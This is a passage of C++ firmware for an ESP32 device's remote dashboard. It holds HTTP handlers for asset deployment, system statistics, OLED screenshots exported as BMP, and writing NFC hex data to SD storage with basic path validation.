        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"write failed\"}", 23);
    }

    file.write(reinterpret_cast<const uint8_t *>(found->content), found->contentLen);
    file.close();

    ESP_LOGI(TAG_RD, "Deployed asset: %s -> %s (%u bytes)",
             found->id, path, static_cast<unsigned>(found->contentLen));

    char json[192];
    snprintf(json, sizeof(json), "{\"ok\":true,\"path\":\"%s\",\"size\":%u}",
             path, static_cast<unsigned>(found->contentLen));

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, json, strlen(json));
}

// ═══════════════════════════════════════════════════════════════════════════════
// System Stats & Screenshot API Handlers
// ═══════════════════════════════════════════════════════════════════════════════

/// GET /api/system/stats – per-core CPU usage, free RAM, chip temperature.
static esp_err_t httpApiSystemStatsHandler(httpd_req_t *req)
{
    const uint32_t freeHeap   = ESP.getFreeHeap();
    const uint32_t totalHeap  = ESP.getHeapSize();
    const uint32_t minFree    = ESP.getMinFreeHeap();
    const uint32_t freePsram  = ESP.getFreePsram();
    const uint32_t uptimeMs   = static_cast<uint32_t>(millis());

    // ESP32 internal temperature sensor (Arduino API).
    float chipTemp = 0.0f;
#ifdef ESP32
    chipTemp = temperatureRead();
#endif

    char json[512];
    snprintf(json, sizeof(json),
             "{\"free_heap\":%lu,\"total_heap\":%lu,\"min_free_heap\":%lu,"
             "\"free_psram\":%lu,\"chip_temp_c\":%.1f,"
             "\"uptime_ms\":%lu,\"sdk\":\"%s\"}",
             static_cast<unsigned long>(freeHeap),
             static_cast<unsigned long>(totalHeap),
             static_cast<unsigned long>(minFree),
             static_cast<unsigned long>(freePsram),
             static_cast<double>(chipTemp),
             static_cast<unsigned long>(uptimeMs),
             ESP.getSdkVersion());

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, json, strlen(json));
}

/// POST /api/ui/screenshot – return the OLED frame buffer as raw BMP.
static esp_err_t httpApiScreenshotHandler(httpd_req_t *req)
{
    auto &disp = DisplayManager::instance();
    uint8_t *fb = disp.getDisplayBuffer();
    if (fb == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"display not ready\"}", 28);
    }

    // Build a minimal 1-bpp BMP (128x64).
    static constexpr uint16_t BMP_W = 128U;
    static constexpr uint16_t BMP_H = 64U;
    static constexpr uint32_t ROW_BYTES = BMP_W / 8U;   // 16 bytes per row
    static constexpr uint32_t IMG_SIZE  = ROW_BYTES * BMP_H; // 1024
    static constexpr uint32_t HEADER_SIZE = 62U; // BMP header + 2-colour palette
    static constexpr uint32_t FILE_SIZE = HEADER_SIZE + IMG_SIZE;

    uint8_t bmp[FILE_SIZE];
    memset(bmp, 0, sizeof(bmp));

    // ── BMP file header ─────────────────────────────────────────────────
    bmp[0] = 'B'; bmp[1] = 'M';
    bmp[2] = FILE_SIZE & 0xFF; bmp[3] = (FILE_SIZE >> 8) & 0xFF;
    bmp[10] = HEADER_SIZE;

    // ── DIB header (BITMAPINFOHEADER, 40 bytes) ─────────────────────────
    bmp[14] = 40;
    bmp[18] = BMP_W & 0xFF; bmp[19] = (BMP_W >> 8) & 0xFF;
    bmp[22] = BMP_H & 0xFF; bmp[23] = (BMP_H >> 8) & 0xFF;
    bmp[26] = 1;   // planes
    bmp[28] = 1;   // bits per pixel
    bmp[34] = IMG_SIZE & 0xFF; bmp[35] = (IMG_SIZE >> 8) & 0xFF;
    bmp[46] = 2;   // colours used

    // ── Colour palette (2 entries × 4 bytes) ────────────────────────────
    // Index 0: black  (B, G, R, 0)
    bmp[54] = 0x00; bmp[55] = 0x00; bmp[56] = 0x00; bmp[57] = 0x00;
    // Index 1: green  (#00FF41)
    bmp[58] = 0x41; bmp[59] = 0xFF; bmp[60] = 0x00; bmp[61] = 0x00;

    // ── Pixel data (SSD1306 page → BMP rows, bottom-up) ────────────────
    for (int16_t row = 0; row < BMP_H; ++row)
    {
        // BMP stores rows bottom-to-top.
        int16_t srcY = (BMP_H - 1) - row;
        uint32_t dstOffset = HEADER_SIZE + static_cast<uint32_t>(row) * ROW_BYTES;

        for (int16_t col = 0; col < BMP_W; ++col)
        {
            // Read pixel from SSD1306 page-addressed buffer.
            size_t page = static_cast<size_t>(srcY) / 8U;
            uint8_t bit = static_cast<uint8_t>(srcY) & 7U;
            bool on = (fb[page * BMP_W + col] >> bit) & 1U;

            if (on)
            {
                // BMP 1-bpp: MSB first within each byte.
                uint8_t byteIdx = static_cast<uint8_t>(col / 8U);
                uint8_t bitIdx  = 7U - static_cast<uint8_t>(col & 7U);
                bmp[dstOffset + byteIdx] |= (1U << bitIdx);
            }
        }
    }

    httpd_resp_set_type(req, "image/bmp");
    httpd_resp_set_hdr(req, "Content-Disposition",
                       "attachment; filename=\"hackos_screen.bmp\"");
    return httpd_resp_send(req, reinterpret_cast<const char *>(bmp), FILE_SIZE);
}

/// POST /api/nfc/write – write hex data back to a file on SD.
static esp_err_t httpApiNfcWriteHandler(httpd_req_t *req)
{
    char buf[POST_BUF_MAX];
    int received = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (received <= 0)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"no body\"}", 19);
    }
    buf[received] = '\0';

    // Parse "path" field.
    const char *pathKey = strstr(buf, "\"path\"");
    if (pathKey == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"missing path\"}", 23);
    }
    const char *ps = strchr(pathKey + 6, '"');
    if (ps == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad path\"}", 20);
    }
    ++ps;
    const char *pe = strchr(ps, '"');
    if (pe == nullptr || (pe - ps) >= 120)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad path\"}", 20);
    }
    char path[128];
    memcpy(path, ps, static_cast<size_t>(pe - ps));
    path[pe - ps] = '\0';

    // Validate path.
    if (strncmp(path, "/ext", 4) != 0 || strstr(path, "..") != nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"invalid path\"}", 23);
    }

    // Parse "hex" field.
    const char *hexKey = strstr(buf, "\"hex\"");
    if (hexKey == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"missing hex\"}", 22);
    }
    const char *hs = strchr(hexKey + 4, '"');
    if (hs == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad hex\"}", 19);
    }
    ++hs;
    const char *he = strchr(hs, '"');
    if (he == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad hex\"}", 19);
    }

    size_t hexLen = static_cast<size_t>(he - hs);
    size_t dataLen = hexLen / 2U;
    if (dataLen == 0U || dataLen > 2048U)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"data too large\"}", 25);
    }

    // Convert hex string to binary (chunked write to save stack).
    auto &vfs = hackos::storage::VirtualFS::instance();
    fs::File file = vfs.open(path, "w");
    if (!file)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"write failed\"}", 23);
    }

    uint8_t chunk[64];
    size_t ci = 0U;
    for (size_t i = 0U; i + 1U < hexLen; i += 2U)
    {
        auto hexVal = [](char c) -> uint8_t {
            if (c >= '0' && c <= '9') return static_cast<uint8_t>(c - '0');
            if (c >= 'a' && c <= 'f') return static_cast<uint8_t>(c - 'a' + 10);
            if (c >= 'A' && c <= 'F') return static_cast<uint8_t>(c - 'A' + 10);
            return 0U;
        };
        chunk[ci++] = static_cast<uint8_t>((hexVal(hs[i]) << 4U) | hexVal(hs[i + 1U]));
        if (ci >= sizeof(chunk))
        {
            file.write(chunk, ci);
            ci = 0U;
        }
    }
    if (ci > 0U)
    {
        file.write(chunk, ci);
    }
    file.close();

    ESP_LOGI(TAG_RD, "NFC write: %s (%u bytes)", path,
             static_cast<unsigned>(dataLen));

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"ok\":true}", 11);
}

} // namespace

// ═══════════════════════════════════════════════════════════════════════════════
// Factory
// ═══════════════════════════════════════════════════════════════════════════════

AppBase *createRemoteDashboardApp()
{
    return new (std::nothrow) RemoteDashboardApp();
}
